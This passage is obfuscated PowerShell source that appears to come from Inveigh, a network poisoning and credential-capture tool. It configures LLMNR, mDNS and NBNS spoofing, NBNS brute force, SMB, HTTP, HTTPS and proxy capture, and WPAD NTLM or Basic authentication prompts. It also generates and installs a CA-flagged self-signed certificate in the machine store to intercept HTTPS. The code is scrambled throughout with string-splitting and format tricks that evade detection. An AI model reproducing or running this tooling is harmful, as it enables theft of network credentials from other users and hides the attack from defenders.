    ${F`IRe`WAll_p`oW`eR`shEll} = ${FIRe`WaLl`_`RuL`Es}."RU`LES" | &("{3}{2}{1}{0}"-f 'ject','b','e-O','Wher') {${_}."EnA`BleD" -eq ${T`RUE} -and ${_}."DIre`CT`ioN" -eq 1} |&("{3}{0}{2}{1}"-f '-','bject','O','Select') -Property ("{0}{1}" -f'Nam','e') | &("{0}{2}{1}{3}"-f'Sele','-S','ct','tring') "Windows PowerShell}"

    if(${FIR`EWall_p`oweRs`hEll})
    {
        ${IN`Ve`iGh}."STaTus_Q`U`E`Ue".("{0}{1}" -f'A','dd').Invoke(("{3}{7}{0}{10}{5}{4}{8}{11}{6}{9}{1}{2}" -f 's F','w','ed','Wind','werShe',' - Po','e = Al','ow','l','lo','irewall','l.ex'))  > ${NU`Ll}
    }

}

${iN`VE`Igh}."sTaT`Us_`quEUE".("{0}{1}"-f 'Ad','d').Invoke(('Pr'+'imary '+'IP'+' '+'Addres'+'s'+' '+'= '+"$IP"))  > ${NU`lL}

if(${l`lm`NR} -eq 'Y' -or ${Md`NS} -eq 'Y' -or ${nb`Ns} -eq 'Y')
{
    ${IN`VEI`Gh}."sTaTUS_`Q`UEUE".("{1}{0}"-f 'd','Ad').Invoke(('LLM'+'NR/mD'+'NS/NBNS'+' '+'S'+'p'+'oofer '+'IP'+' '+'A'+'d'+'dress '+'= '+"$SpooferIP"))  > ${nU`lL}
}

if(${lLm`NR} -eq 'Y')
{

    if(${el`EVAT`eD_prIV`ILEge} -or !${llM`Nr_pO`Rt_C`Heck})
    {
        ${inV`E`IgH}."staT`US`_qUEUe".("{1}{0}"-f'dd','A').Invoke(("{6}{0}{4}{5}{1}{3}{2}"-f'LM','ofer = E','abled','n','N','R Spo','L'))  > ${n`ULL}
        ${inVe`I`gH}."sTatu`S_qUE`Ue".("{1}{0}" -f 'dd','A').Invoke(('LLMNR'+' '+'TTL'+' '+'= '+"$LLMNRTTL "+'S'+'econds'))  > ${N`ULl}
        ${llMnR`_RES`p`o`NSe`_MESSAge} = ("{3}{2}{1}{0}"-f 't','nse sen','respo','- ')
    }
    else
    {
        ${LL`Mnr} = "N"
        ${i`NVE`Igh}."st`ATUS_qUe`UE".("{0}{1}" -f'A','dd').Invoke(("{3}{6}{8}{1}{0}{7}{4}{2}{5}" -f 'le','isab',' In Use Por','LLMNR Spoof','ue To','t 5355','er','d D',' D'))  > ${nu`Ll}
    }

}
else
{
    ${In`V`eIgh}."STATuS`_QU`eUe".("{0}{1}" -f'Ad','d').Invoke(("{3}{1}{0}{2}{4}"-f'poofer = D','R S','isabl','LLMN','ed'))  > ${NU`Ll}
    ${LLMNR_r`esP`O`NSE_meSs`AgE} = ("{2}{4}{0}{1}{3}" -f'r ','i','-','s disabled',' LLMNR spoofe')
}

if(${m`DnS} -eq 'Y')
{

    if(${ELevATEd_P`RiVIl`e`ge} -or !${mDn`S`_`poRt_CHEck})
    {
        ${mDnS`TYPE`s_o`UTpUT} = ${M`Dnst`YpES} -join ","

        if(${mdns`TY`peS}."cO`UNT" -eq 1)
        {
            ${INv`e`IgH}."sTat`US_Q`UEUE".("{0}{1}"-f 'A','dd').Invoke(('mD'+'NS '+'Spoofe'+'r '+'For'+' '+'Ty'+'pe '+"$mDNSTypes_output "+'= '+'Enable'+'d'))  > ${nu`ll}
        }
        else
        {
            ${in`VEI`Gh}."StATU`S`_qUeUe".("{1}{0}" -f 'dd','A').Invoke(('m'+'DNS '+'Spo'+'of'+'er '+'For'+' '+'Type'+'s '+"$mDNSTypes_output "+'= '+'E'+'nab'+'led'))  > ${n`UlL}
        }

        ${I`NVei`Gh}."staT`Us_`que`UE".("{0}{1}" -f'Ad','d').Invoke(('mDNS'+' '+'TTL'+' '+'= '+"$mDNSTTL "+'Secon'+'d'+'s'))  > ${N`UlL}
        ${mdN`S`_reSpOnse_ME`sS`A`Ge} = ("{2}{0}{3}{1}"-f're','se sent','- ','spon')

    }
    else
    {
        ${m`DNS} = "N"
        ${iN`V`EIgh}."sT`AtUs_`Q`UEuE".("{1}{0}" -f'dd','A').Invoke(("{2}{5}{8}{6}{3}{0}{4}{7}{1}" -f 'e To In ','rt 5353','mDNS','isabled Du','Use',' Sp',' D',' Po','oofer'))  > ${n`UlL}
    }

}
else
{
    ${In`V`eiGH}."s`Tat`US_QU`euE".("{0}{1}"-f 'Ad','d').Invoke(("{6}{3}{1}{4}{2}{5}{0}"-f'd','ofer =','abl','Spo',' Dis','e','mDNS '))  > ${n`ULL}
    ${mDNs_reSPon`s`E_M`E`sSAge} = ("{3}{2}{0}{5}{4}{7}{6}{1}"-f'r','d','oofe','- mDNS sp','s',' i','able',' dis')
}

if(${Nb`NS} -eq 'Y')
{
    ${nBNs`TY`PeS_`OUTPUt} = ${nBn`ST`YPEs} -join ","
    ${n`Bns_r`eSpONse_M`eSSAGE} = ("{2}{3}{0}{1}" -f 'e se','nt','- re','spons')
    
    if(${n`B`Ns`Types}."cOu`Nt" -eq 1)
    {
        ${iNVE`i`gH}."sTATus`_QUe`UE".("{0}{1}"-f'A','dd').Invoke(('NB'+'NS '+'Sp'+'oo'+'fer '+'F'+'or '+'Type'+' '+"$NBNSTypes_output "+'= '+'En'+'able'+'d'))  > ${nu`LL}
    }
    else
    {
        ${INv`e`igh}."sTa`TU`S_QUe`Ue".("{1}{0}" -f'dd','A').Invoke(('NB'+'NS '+'Spoofe'+'r'+' '+'F'+'or '+'Type'+'s'+' '+"$NBNSTypes_output "+'= '+'Enabl'+'ed'))  > ${n`ULL}
    }

}
else
{
    ${INvE`Igh}."sT`AtUS_qu`eUE".("{0}{1}" -f'A','dd').Invoke(("{3}{0}{1}{4}{2}"-f 'of','er = Di','d','NBNS Spo','sable'))  > ${N`Ull}
    ${NBN`S_reSpONsE_`M`ES`SAGE} = ("{0}{2}{1}{3}{6}{4}{5}" -f'- NBN','o','S spo','fer ','s di','sabled','i')
}

if(${nbnS`B`RuTefOrce} -eq 'Y')
{   
    ${inv`E`iGh}."s`T`ATuS_qU`euE".("{0}{1}"-f'A','dd').Invoke(('N'+'BNS '+'Bru'+'te '+'Fo'+'rce '+'Spoofe'+'r '+'Target'+' '+'= '+"$NBNSBruteForceTarget")) > ${nU`LL}
    ${iN`VEiGh}."S`Ta`TUS_QuE`Ue".("{1}{0}" -f 'dd','A').Invoke(('NBN'+'S '+'B'+'rut'+'e '+'Fo'+'rce '+'S'+'poofer '+'I'+'P '+'Ad'+'dre'+'ss '+'= '+"$SpooferIP")) > ${nU`ll}
    ${iNV`EiGh}."S`TATUS_Q`UeUe".("{1}{0}" -f'dd','A').Invoke(('N'+'BNS '+'Brut'+'e '+'Force'+' '+'Spo'+'ofe'+'r '+'Hostna'+'me'+' '+'= '+"$NBNSBruteForceHost")) > ${NU`lL}

    if(${N`BNsBr`UTEFO`R`cEpausE})
    {
        ${InV`E`igh}."StaT`Us_`Qu`Eue".("{1}{0}"-f 'dd','A').Invoke(('N'+'BNS '+'Brute'+' '+'Forc'+'e '+'Pause'+' '+'= '+"$NBNSBruteForcePause "+'S'+'econds')) > ${n`UlL}
    }

}

if(${N`BNs} -eq 'Y' -or ${nBnsbrUT`EFo`R`CE} -eq 'Y')
{
    ${inVE`I`gh}."StAt`U`S_`queUe".("{1}{0}" -f 'dd','A').Invoke(('N'+'BNS '+'TT'+'L '+'= '+"$NBNSTTL "+'Seco'+'nds')) > ${N`Ull}
}

if(${SpoOfERle`AR`NInG} -eq 'Y' -and (${Ll`MnR} -eq 'Y' -or ${Nb`NS} -eq 'Y'))
{
    ${I`NV`EIgh}."staTus_`QU`EUE".("{1}{0}" -f 'd','Ad').Invoke(("{1}{3}{0}{4}{5}{2}"-f 'n','Spoofer','abled',' Lear','ing =',' En'))  > ${nu`Ll}

    if(${SPooFe`RlEaRNI`NGDEl`Ay} -eq 1)
    {
        ${INV`eIgh}."sta`T`Us_`qUEuE".("{0}{1}"-f 'Ad','d').Invoke(('Sp'+'oofe'+'r '+'Learn'+'ing'+' '+'De'+'l'+'ay '+'= '+"$SpooferLearningDelay "+'Min'+'ute'))  > ${N`UlL}
    }
    elseif(${sPOo`FERLe`A`R`N`ingdELAY} -gt 1)
    {
        ${I`NvEigh}."sTAtUS`_Q`UEuE".("{0}{1}" -f'A','dd').Invoke(('Sp'+'oofer'+' '+'L'+'ea'+'rning '+'Del'+'ay '+'= '+"$SpooferLearningDelay "+'M'+'inute'+'s'))  > ${n`ULL}
    }
    
    if(${SpOOFer`LeaR`Ni`NG`iNTER`VAL} -eq 1)
    {
        ${Inv`Ei`gH}."sta`T`Us`_qUEUe".("{1}{0}"-f 'dd','A').Invoke(('Spoo'+'f'+'er '+'Learni'+'ng '+'Int'+'erva'+'l '+'= '+"$SpooferLearningInterval "+'Minut'+'e'))  > ${NU`Ll}
    }
    elseif(${SPOOfe`RL`E`ARNI`N`g`InTErVal} -eq 0)
    {
        ${i`N`VeIGh}."stAtUS_`qu`E`UE".("{0}{1}" -f'A','dd').Invoke(("{6}{3}{0}{1}{9}{7}{5}{8}{2}{4}" -f 'o','fe',' Dis','o','abled','ng In','Sp','earni','terval =','r L'))  > ${nu`LL}
    }
    elseif(${sp`O`oFERLE`Ar`NINGInTE`RV`AL} -gt 1)
    {
        ${I`Nv`EIGh}."ST`AtuS_`QUeUE".("{1}{0}" -f'dd','A').Invoke(('Spoof'+'e'+'r '+'Le'+'a'+'rning '+'I'+'nt'+'erval '+'= '+"$SpooferLearningInterval "+'Min'+'ute'+'s'))  > ${nu`lL}
    }

}

if(${S`pOoF`erHoS`TSrEplY} -and (${L`LmNr} -eq 'Y' -or ${n`Bns} -eq 'Y'))
{
    ${I`NVei`gh}."sT`AT`US_QU`EuE".("{1}{0}" -f 'dd','A').Invoke(("{4}{3}{1}{0}{2}"-f'ts Rep','s','ly = ','Ho','Spoofer ') + (${sP`oOFer`HOsTsReP`LY} -join ","))  > ${N`ULL}
}

if(${spOoFERHost`sIg`No`Re} -and (${l`LM`NR} -eq 'Y' -or ${n`BNs} -eq 'Y'))
{
    ${In`V`EigH}."sTA`TU`S_`QuEUe".("{0}{1}" -f'A','dd').Invoke(("{1}{0}{2}{3}{4}"-f 'oofer Hosts I','Sp','g','nore ','= ') + (${SPO`OFerho`S`TSigNOrE} -join ","))  > ${NU`LL}
}

if(${S`PoOfEripS`Re`PlY} -and (${l`Lm`Nr} -eq 'Y' -or ${nb`NS} -eq 'Y'))
{
    ${InV`EI`Gh}."StA`Tus`_QueUE".("{0}{1}" -f'Ad','d').Invoke(("{0}{3}{2}{1}"-f'Spo',' = ','r IPs Reply','ofe') + (${SpoO`Fe`RiPSREp`ly} -join ","))  > ${Nu`ll}
}

if(${SPoofER`I`PSi`GNO`Re} -and (${l`Lm`NR} -eq 'Y' -or ${n`BnS} -eq 'Y'))
{
    ${i`NVE`iGh}."S`TA`Tus_Q`UEue".("{1}{0}" -f'd','Ad').Invoke(("{3}{4}{1}{2}{5}{0}"-f ' Ignore = ','oofer ','I','S','p','Ps') + (${sp`ooF`E`Ri`PSIG`NORE} -join ","))  > ${N`ULL}
}

if(${SpoOFErR`E`peat} -eq 'N')
{
    ${In`VEigH}."spoof`E`R_REP`EaT" = ${fal`se}
    ${iNvE`I`GH}."StATUs_q`U`eUe".("{0}{1}"-f 'Ad','d').Invoke(("{2}{0}{4}{1}{3}"-f 'er Re','g = Disabl','Spoof','ed','peatin'))  > ${nU`ll}
}
else
{
    ${INV`eigh}."SpOOFE`R_`REpEAt" = ${TR`Ue}
}

if(${s`mB} -eq 'Y' -and ${e`LEVA`Ted_Pr`Iv`IlEge})
{
    ${I`N`VEiGH}."sT`At`US`_queUE".("{0}{1}" -f 'Ad','d').Invoke(("{3}{0}{2}{5}{1}{4}{6}" -f'B Ca','re = Enab','pt','SM','l','u','ed'))  > ${N`UlL}
}
else
{
    ${iNv`e`iGh}."sTAtus_`qU`EUe".("{0}{1}" -f'A','dd').Invoke(("{0}{1}{6}{3}{4}{5}{2}"-f'SMB C','aptu','d','e ','= Disab','le','r'))  > ${n`ULl}
}

if(${h`Ttp} -eq 'Y')
{

    if(${h`TtP_PO`RT_`CH`E`Ck})
    {
        ${H`TtP} = "N"
        ${i`N`VEigH}."StATus`_qu`EUE".("{0}{1}" -f 'Ad','d').Invoke(('HT'+'TP '+'Captu'+'r'+'e '+'Disab'+'l'+'ed '+'D'+'ue '+'To'+' '+'In'+' '+'Us'+'e '+'Port'+' '+"$HTTPPort"))  > ${NU`ll}
    }
    else
    {

        if(${HtTp`ip} -ne ("{0}{1}" -f'0.','0.0.0'))
        {
            ${IN`V`EIgh}."ST`AT`Us_QuEue".("{1}{0}"-f'dd','A').Invoke(('HT'+'TP '+'IP'+' '+'= '+"$HTTPIP")) > ${NU`LL}
        }

        if(${HTT`pp`OrT} -ne 80)
        {
            ${iN`VEI`gH}."STaT`Us_Q`UE`UE".("{0}{1}"-f'A','dd').Invoke(('HTT'+'P '+'P'+'ort '+'= '+"$HTTPPort")) > ${nu`Ll}
        }

        ${I`NVei`Gh}."STAtu`S_quE`UE".("{0}{1}" -f 'A','dd').Invoke(("{3}{4}{1}{2}{0}"-f 'Enabled','pture ','= ','HTT','P Ca'))  > ${Nu`lL}
    }

}
else
{
    ${In`VEiGH}."sT`A`TUS_qUEUe".("{1}{0}" -f 'd','Ad').Invoke(("{4}{2}{1}{3}{0}{5}" -f'= Di','TP','T',' Capture ','H','sabled'))  > ${n`Ull}
}

if(${h`TtpS} -eq 'Y')
{

    if(${HtT`PS_por`T_c`HecK})
    {
        ${HT`TpS} = "N"
        ${iNVE`IgH}."H`Ttps" = ${FaL`SE}
        ${INV`Ei`GH}."STaTus`_q`U`EUE".("{0}{1}"-f'Ad','d').Invoke(('H'+'TT'+'PS '+'Capt'+'u'+'re '+'D'+'isab'+'le'+'d '+'Due'+' '+'To'+' '+'I'+'n '+'Use'+' '+'P'+'ort '+"$HTTPSPort"))  > ${Nu`ll}
    }
    else
    {

        try
        { 
            ${IN`Ve`iGH}."c`eRtI`F`I`caTe_issueR" = ${HTtPSCER`Tis`Su`er}
            ${i`NVe`IGh}."CERtiF`I`c`AtE_CN" = ${ht`TP`SCE`R`T`SubjECT}
            ${in`Ve`IgH}."StatU`s_`q`Ueue".("{1}{0}" -f 'dd','A').Invoke(("{5}{6}{2}{0}{3}{4}{1}" -f 'icat','suer = ','tif','e',' Is','H','TTPS Cer') + ${i`NV`eigH}."ceR`Tif`IC`Ate_i`S`SuEr")  > ${nU`ll}
            ${INvei`Gh}."st`AtuS_Qu`e`Ue".("{1}{0}" -f'd','Ad').Invoke(("{3}{0}{2}{1}"-f'erti',' ','ficate CN =','HTTPS C') + ${i`Nve`IGh}."CeRti`F`iC`ATE_Cn")  > ${N`Ull}
            ${c`er`Tific`ATe_CH`e`ck} = (&("{4}{2}{1}{0}{3}" -f 'te','ldI','-Chi','m','Get') (("{5}{3}{1}{2}{4}{0}" -f 'My','h','i','ocalMac','neb9y','Cert:b9yL')).("{1}{0}"-f'PlAcE','rE').Invoke('b9y','\') | &("{0}{1}{2}"-f 'Where-Obj','ec','t') {${_}."I`ss`UEr" -Like "CN=" + ${iN`VEi`Gh}."cErTiF`icaT`e_i`SSu`er"})

            if(!${cE`RTi`FIc`At`E_CHeCK})
            {
                
                ${CErtI`Fi`ca`Te`_dIs`TIn`guIShED`_NA`me} = &("{2}{1}{0}" -f 'ect','ew-obj','n') -com ("{5}{2}{4}{1}{6}{0}{3}"-f 'e','ist','09Enrollment.CX5','dName','00D','X5','inguish')
                ${cE`RT`iF`iCa`TE_dIS`TiNGUiSH`e`d_NAme}.("{1}{0}{2}"-f 'od','Enc','e').Invoke( "CN=" + ${inV`EI`GH}."CErTi`FI`cAte_cN", ${CeRti`F`i`cAt`E_Di`S`TING`UIsh`Ed_NAmE}."x500nam`Efla`gs"."x`500nameFLa`gs"."Xc`N_`CER`T_nAme`_st`R_NOnE")
                ${c`er`Ti`FIcatE_`iSsu`E`R`_disT`INg`UIs`heD_NAMe} = &("{0}{1}{2}"-f 'n','ew','-object') -com ("{6}{4}{2}{5}{1}{3}{10}{7}{0}{9}{8}"-f 's','500Dis','rollmen','t','En','t.CX','X509','gui','Name','hed','in')
                ${CE`RTIfic`AT`E`_iSsUER_DiStin`gU`IshED_`N`AMe}.("{0}{1}"-f'Enco','de').Invoke("CN=" + ${I`N`VEIGh}."c`eRtiFiCaT`e_`ISsueR", ${ce`RtiF`Ic`AtE_Di`sTInGu`IshE`d`_NA`mE}."X`500na`MEf`Lags"."x500NAM`E`F`LAGs"."X`cN`_c`E`Rt_NaM`e_sT`R_NONE")
                ${CertIfic`AT`e_KeY} = &("{0}{1}{2}" -f 'ne','w','-object') -com ("{0}{3}{1}{4}{2}{5}"-f'X509Enro','ent.CX50','ivateK','llm','9Pr','ey')
                ${CERtI`FiC`A`TE_keY}."proViD`er`NA`ME" = ("{7}{5}{3}{6}{1}{9}{2}{8}{0}{4}" -f ' Cryptogra','nced RSA and','A','t En','phic Provider','rosof','ha','Mic','ES',' ')
                ${cE`Rt`if`i`C`ATe_KEy}."kEYS`p`Ec" = 2
                ${Ce`RTiFIc`ATe_`KEy}."L`En`Gth" = 2048
			    ${c`ER`TI`FICaT`E_keY}."MACHI`NEc`o`NT`eXt" = 1
                ${Certif`ICA`Te_k`ey}.("{0}{1}" -f'Cre','ate').Invoke()
                ${ceRt`If`ICATe_seRv`er_a`U`T`H_`oID} = &("{0}{1}{2}"-f'new-obj','ec','t') -com ("{2}{3}{0}{4}{1}"-f'.CObj','tId','X509Enr','ollment','ec')
			    ${C`ER`TifIC`ATe`_seRVER_`A`U`TH_OID}.("{4}{2}{0}{3}{1}" -f 'eFromV','lue','iz','a','Initial').Invoke(("{1}{3}{0}{2}{4}"-f'.1.5','1.3','.5','.6','.7.3.1'))
			    ${cEr`T`IfIcaTe_en`H`Anced_K`e`Y_`U`sAge`_o`id} = &("{2}{1}{0}"-f 'ject','ob','new-') -com ("{0}{1}{6}{3}{7}{2}{5}{4}" -f'X5','09','jectI','t','1','ds.','Enrollmen','.COb')
			    ${cERTifi`C`A`TE_eN`haNced_key`_`U`SaGE_Oid}.("{1}{0}"-f 'dd','a').Invoke(${c`e`R`Ti`FicAte`_sERveR_`AuT`h_OiD})
			    ${CERT`ifi`CaT`E_enHANC`ed_K`EY_USAgE_Ex`T`enSiOn} = &("{2}{0}{1}" -f 'w-o','bject','ne') -com ("{8}{6}{3}{4}{5}{0}{7}{2}{1}{9}"-f 'nsionEn','Us','ancedKey','ollm','ent.CX509Ex','te','509Enr','h','X','age')
			    ${cERt`IficaTe_ENhAn`Ced_`KeY`_usa`G`e_EXtEnSioN}.("{3}{1}{0}{4}{2}"-f 'ial','it','code','In','izeEn').Invoke(${CErTiF`IcaTe_`ENh`An`CeD_keY_USaGE`_O`ID})
			    ${cER`TIFIca`TE} = &("{2}{0}{1}" -f'jec','t','new-ob') -com ("{9}{7}{8}{0}{4}{3}{2}{1}{5}{6}" -f'l','eRequestC','cat','fi','ment.CX509Certi','erti','ficate','ro','l','X509En')
			    ${c`eR`TificA`Te}.("{4}{5}{2}{3}{6}{1}{0}"-f'vateKey','mPri','z','eF','Initial','i','ro').Invoke(2,${CERTiF`iC`Ate_kEy},"")
			    ${Ce`RtIFI`catE}."s`UBJEct" = ${CErtIfi`ca`TE_diSt`i`N`g`UIShe`d_`NA`mE}
			    ${CeR`Ti`FICAtE}."iS`sUEr" = ${Cert`I`FiC`AtE_`I`S`sue`R`_dIStiNGuished_na`ME}
			    ${cERt`ifi`cA`TE}."noT`Befo`Re" = (&("{1}{2}{0}"-f 'te','get-','da')).("{0}{1}{2}"-f 'A','dd','Days').Invoke(-271)
			    ${CER`Ti`Fi`CATe}."n`O`TaFter" = ${Ce`RT`iF`IcATe}."Not`B`EfORE".("{0}{1}{2}" -f'Add','D','ays').Invoke(824)
			    ${cErtiFiCaT`e_H`Ash`_`Alg`orIThm_OiD} = &("{1}{3}{0}{2}" -f'ec','New-','t','Obj') -ComObject ("{3}{5}{6}{1}{0}{2}{4}"-f'.CObj','llment','ect','X509','Id','Enr','o')
			    ${CeRt`I`FicaTe`_HASH`_`ALg`o`RitHm_`oid}.("{5}{2}{0}{3}{7}{4}{6}{1}"-f'FromA','ame','ialize','lgori','h','Init','mN','t').Invoke(1,0,0,("{0}{1}"-f 'S','HA256'))
			    ${C`eRtI`FicAte}."hASH`AlG`oRIthm" = ${cErTIfIca`TE_H`Ash_`A`lgORIt`HM_`oID}
                ${CE`RT`ifi`CAte}."X`509EXtE`N`Sio`NS".("{1}{0}"-f'dd','A').Invoke(${CE`RTifiCATE_EnHAnc`Ed_KEY_u`s`Ag`E`_e`X`TEN`sioN})
                ${CERT`i`FicAtE_B`A`SIc_`cons`TRaintS} = &("{1}{2}{0}"-f't','new-obj','ec') -com ("{2}{8}{3}{4}{5}{0}{1}{6}{7}" -f'ensionBasi','cC','X509E','llme','nt','.CX509Ext','onstrai','nts','nro')
			    ${cErtI`F`ic`Ate_BaS`IC_cONsTR`Ai`NTs}.("{3}{4}{5}{0}{2}{1}"-f'ial','Encode','ize','I','n','it').Invoke(("{1}{0}"-f'rue','t'),1)
                ${Ce`R`TiFIca`TE}."X509`Ext`EnS`ioNS".("{1}{0}"-f 'dd','A').Invoke(${CErtiF`iCaTE_BaS`IC_`coNSt`R`AinTs})
                ${c`erTi`F`IcAte}.("{1}{0}" -f 'e','Encod').Invoke()
                ${C`eRtIf`iCA`TE_eNRoLLMe`NT} = &("{1}{0}{2}" -f '-ob','new','ject') -com ("{1}{2}{8}{5}{6}{3}{4}{7}{0}"-f 'lment','X509En','r','X50','9En','m','ent.C','rol','oll')
			    ${cER`Ti`FiCA`TE_EnR`Ol`Lm`Ent}.("{0}{3}{2}{1}" -f 'Initi','uest','eFromReq','aliz').Invoke(${CERT`IFiC`ATE})
			    ${CEr`TiFicATE`_d`AtA} = ${c`eRTiF`ICa`T`e_E`NRolL`MeNT}.("{0}{1}{2}{3}"-f 'CreateReq','u','e','st').Invoke(0)
                ${cE`Rtif`Ic`AT`e_eNrOLlme`Nt}.("{2}{0}{3}{1}" -f 'l','ponse','Insta','lRes').Invoke(2,${Cer`Tific`Ate_`dATA},0,"")
                ${iNvE`i`gh}."CER`T`IfIC`ATE" = (&("{0}{2}{1}" -f 'Get','ildItem','-Ch') ((("{1}{4}{0}{3}{5}{2}"-f'uGZLo','Cert','y','calMa',':','chineuGZM'))  -REpLACe  ([cHar]117+[cHar]71+[cHar]90),[cHar]92) | &("{0}{3}{2}{1}"-f 'Wh','ect','bj','ere-O') {${_}."ISs`UEr" -match ${iNV`EiGh}."CErT`if`icAt`E_issu`er"})
            }
            else
            {
                
                if(${hTtpsForc`e`c`ErTdE`le`Te} -eq 'Y')
                {
                    ${I`Nv`EigH}."h`TtP`S_`FOrC`e_CERTIf`IC`Ate_`DelEtE" = ${T`Rue}
                }

                ${I`N`VEiGh}."h`TTpS`_eXistIng_cErT`I`FicATE" = ${T`RUe}
                ${In`V`EiGH}."sT`ATUS_QU`E`UE".("{0}{1}"-f 'A','dd').Invoke(("{0}{4}{6}{3}{7}{2}{1}{5}"-f'H','ti','ing Cer','sing Exi','TTPS Capture ','ficate','= U','st'))  > ${N`ULl}
            }
            
            ${iN`VEIGH}."HT`TPs" = ${T`Rue}

            if(${Htt`piP} -ne ("{0}{2}{1}" -f'0','.0.0','.0'))
            { 
                ${In`VeiGh}."STatUS_`QU`e`UE".("{1}{0}"-f 'd','Ad').Invoke(('HTTP'+'S '+'I'+'P '+'= '+"$HTTPIP")) > ${nu`lL}
            }

            if(${htt`psp`O`RT} -ne 443)
            {   
                ${in`VeI`Gh}."statu`S_qU`e`Ue".("{1}{0}"-f'd','Ad').Invoke(('HTT'+'PS '+'Por'+'t '+'= '+"$HTTPSPort")) > ${n`ULL}
            }

            ${Inve`IGh}."stA`T`Us`_quEUE".("{1}{0}" -f'dd','A').Invoke(("{1}{2}{3}{0}{4}"-f '= Ena','H','TTPS Captur','e ','bled'))  > ${Nu`LL}

        }
        catch
        {
            ${Ht`T`ps} = "N"
            ${Inve`I`gh}."ht`TpS" = ${FA`LsE}
            ${inv`E`IGH}."StaTu`S_q`UeuE".("{1}{0}"-f'dd','A').Invoke(("{13}{4}{10}{3}{2}{6}{0}{8}{9}{11}{1}{7}{5}{12}" -f'D','To','u','t','PS ','Certificate Err','re ',' ','isabled ','Due','Cap',' ','or','HTT'))  > ${nu`lL}
        }

    }

}
else
{
    ${i`Nvei`gH}."STa`Tu`S_QUEue".("{0}{1}"-f 'A','dd').Invoke(("{2}{4}{5}{1}{3}{0}" -f 'sabled',' ','HTTPS ','Di','Captur','e ='))  > ${nU`Ll}
}

if(${h`Ttp} -eq 'Y' -or ${h`TTPs} -eq 'Y')
{
    ${INvEI`gH}."sTAt`US_QU`euE".("{1}{0}"-f 'd','Ad').Invoke(('HTT'+'P/'+'HTTP'+'S '+'Authe'+'nt'+'ica'+'tion'+' '+'= '+"$HTTPAuth"))  > ${NU`Ll}
    ${in`VEIGH}."S`T`ATUS_QuEUE".("{0}{1}"-f'A','dd').Invoke(('W'+'PAD '+'Authen'+'t'+'icati'+'on '+'= '+"$WPADAuth"))  > ${n`UlL}

    if(${wPAdA`U`TH} -like ("{1}{0}"-f'M*','NTL'))
    {
        ${wpaD`AuthiGnO`Re} = (${Wp`A`dau`THIgnore} | &("{0}{2}{1}{3}"-f'Wher','ec','e-Obj','t') {${_} -and ${_}.("{0}{1}" -f 'Tr','im').Invoke()})

        if(${W`PA`Dau`THiGnore}."cOu`Nt" -gt 0)
        {
            ${INv`EI`gh}."StaTu`s_`Q`UEUe".("{1}{0}" -f'd','Ad').Invoke(("{8}{9}{3}{7}{4}{0}{2}{1}{6}{5}" -f'n Ign',' List','ore','hent','io',' ',' =','icat','WPAD NTL','M Aut') + (${WpaDau`THIg`NO`Re} -join ","))  > ${N`ULl}
        }

    }

    if(${HTT`PD`IR} -and !${h`T`TPRespOnse})
    {
        ${in`VEI`GH}."ST`ATus_`queUE".("{0}{1}" -f'A','dd').Invoke(('HTTP/'+'HTT'+'PS '+'Direct'+'o'+'ry '+'= '+"$HTTPDir"))  > ${NU`lL}

        if(${HTT`PdefA`U`lt`FiLE})
        {
            ${I`Nv`eIgh}."StaT`Us_Q`U`eUe".("{1}{0}"-f'dd','A').Invoke(('HTTP/HT'+'TP'+'S '+'De'+'fault'+' '+'R'+'es'+'ponse '+'Fi'+'le '+'= '+"$HTTPDefaultFile"))  > ${Nu`lL}
        }

        if(${H`TtPD`eFAultexE})
        {
            ${INvEI`GH}."statuS_Q`U`euE".("{1}{0}"-f'd','Ad').Invoke(('HTTP'+'/HT'+'TP'+'S '+'De'+'f'+'ault '+'Respons'+'e'+' '+'Exec'+'ut'+'able '+'= '+"$HTTPDefaultEXE"))  > ${Nu`ll}
        }

    }

    if(${HtT`pRE`SponSE})
    {
        ${in`VEi`GH}."statUs_Q`UE`UE".("{1}{0}"-f 'd','Ad').Invoke(("{5}{7}{3}{4}{1}{6}{0}{2}" -f 'Ena','esponse ','bled','PS ','R','HTTP/HT','= ','T'))  > ${NU`Ll}
    }

    if(${hTtP`RESp`o`NSe} -or ${HttP`DIr} -and ${h`TT`p`coNt`ENttYPe} -ne ("{1}{2}{0}" -f'l/text','ht','m'))
    {
        ${I`NvEi`GH}."S`TatUS_Q`UeuE".("{0}{1}"-f 'Ad','d').Invoke(('H'+'TT'+'P/HT'+'TPS/Pr'+'ox'+'y '+'Con'+'te'+'nt '+'Ty'+'pe '+'= '+"$HTTPContentType"))  > ${nu`Ll}
    }

    if(${HTT`paUtH} -eq ("{0}{1}"-f 'Ba','sic') -or ${WPAd`Au`TH} -eq ("{0}{1}"-f 'B','asic'))
    {
        ${inVe`IGh}."STaTUs_Q`U`eue".("{1}{0}" -f 'dd','A').Invoke(('Ba'+'si'+'c '+'Authe'+'n'+'t'+'icat'+'ion '+'R'+'eal'+'m '+'= '+"$HTTPBasicRealm"))  > ${N`ULl}
    }

    ${Ht`TP`Re`s`EtDeLaY} = (${hTt`p`Rese`TdelAy} | &("{2}{1}{0}" -f 're-Object','he','W') {${_} -and ${_}.("{1}{0}" -f 'rim','T').Invoke()})

    if(${HT`Tp`ReSe`TDE`lAY}."CO`UnT" -gt 0)
    {
        ${i`NvEIgh}."st`AtuS_Q`UEUe".("{0}{1}"-f'Ad','d').Invoke(("{0}{1}{2}{4}{5}{3}"-f'HTT','P Re','set',' = ',' Dela','y List') + (${HTTpRE`S`e`T`delaY} -join ","))  > ${n`Ull}
        ${I`NVE`iGH}."sTATus`_q`UEUe".("{1}{0}"-f'd','Ad').Invoke(('HTT'+'P '+'R'+'ese'+'t '+'De'+'lay '+'Ti'+'meo'+'ut '+'= '+"$HTTPResetDelayTimeout "+'Se'+'conds')) > ${Nu`Ll}
    }

    if(${pR`Oxy} -eq 'Y')
    {

        if(${pro`x`Y_`PO`Rt_cHECk})
        {
            ${p`Ro`XY} = "N"
            ${iNVe`IGh}."stA`TUS_q`U`euE".("{0}{1}" -f 'A','dd').Invoke(('Pr'+'oxy '+'Ca'+'pture'+' '+'Disa'+'bled'+' '+'Du'+'e '+'To'+' '+'I'+'n '+'U'+'se '+'P'+'ort '+"$ProxyPort"))  > ${NU`Ll}
        }
        else
        {
            ${INVE`IGh}."S`TaTuS_`qUe`UE".("{1}{0}"-f 'dd','A').Invoke(("{5}{3}{1}{6}{0}{4}{2}" -f 're = ','t','ed','roxy Cap','Enabl','P','u'))  > ${NU`lL}
            ${in`V`eIgH}."StA`TUs`_q`UEue".("{0}{1}" -f 'Ad','d').Invoke(('Pr'+'oxy '+'Port'+' '+'= '+"$ProxyPort")) > ${NU`Ll}
